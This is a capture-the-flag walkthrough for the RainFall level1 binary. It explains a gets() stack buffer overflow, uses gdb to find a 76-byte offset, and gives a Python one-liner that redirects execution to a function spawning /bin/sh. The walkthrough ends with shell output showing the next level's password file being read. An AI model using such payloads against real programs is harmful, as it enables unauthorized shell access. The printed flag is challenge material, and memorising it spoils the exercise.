📘 Buffer Overflow Exploit: Level 1
This is a classic stack-based buffer overflow example that demonstrates how you can redirect program execution to custom code by overflowing a buffer.

⚠️ Vulnerability Summary
The binary uses the unsafe gets() function.

gets() does not check how much input is provided.

So if you input more than the buffer can hold, it will start overwriting adjacent memory — including the saved return address on the stack.

This allows us to control the program's flow after the current function returns.

🧠 Our Goal
There is a hidden function in the binary named run() located at: 0x08048444
This function calls: system("/bin/sh");
💡 If we overwrite the return address to jump to run(), we get a shell as the level1 user.

🔎 Finding the Offset
To exploit this, we first need to know how many bytes it takes to reach the saved return address on the stack.

Step 1: Try 80 characters and check if EIP is overwritten

$ python -c 'print "B" * 80' > /tmp/payload
(gdb) r < /tmp/payload
Output:
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
✅ EIP is overwritten with 0x42 ("B" in ASCII) — good sign.

Step 2: Try 76 characters
$ python -c 'print "B" * 76' > /tmp/payload
(gdb) r < /tmp/payload
Output:
Program received signal SIGILL, Illegal instruction.
0xb7e45400 in __libc_start_main ()
✅ At 76 bytes, we don’t overwrite EIP yet, so offset is exactly 76 bytes.

🛠 Crafting the Exploit
Here’s the working exploit:
(python -c 'import struct; print "A"*76 + struct.pack("<I", 0x08048444)'; cat) | ./level1

🔍 Explanation
python -c '...': We use Python to generate the exploit payload.

"A" * 76: Fills the buffer right up to the return address.

struct.pack("<I", 0x08048444): Packs the address of run() in little-endian format (\x44\x84\x04\x08).
< — little-endian
I — unsigned 4-byte integer

cat: Keeps stdin open — sometimes required if the program reads input again.

| ./level1: Feeds the payload into the vulnerable binary.

✅ What Happens?
gets() reads our input (76 A's + address of run()).

When main() tries to return, it jumps to 0x08048444.

That’s the run() function → which runs system("/bin/sh").


level1@RainFall:~$ (python -c 'import struct; print "A"*76 + struct.pack("<I", 0x08048444)'; cat) | ./level1
or
python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
cat /tmp/payload - | ./level1

Good... Wait what?
./pass
/bin/sh: 1: ./pass: Permission denied
whoami
level2
cat /home/user/level2/.pass            
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

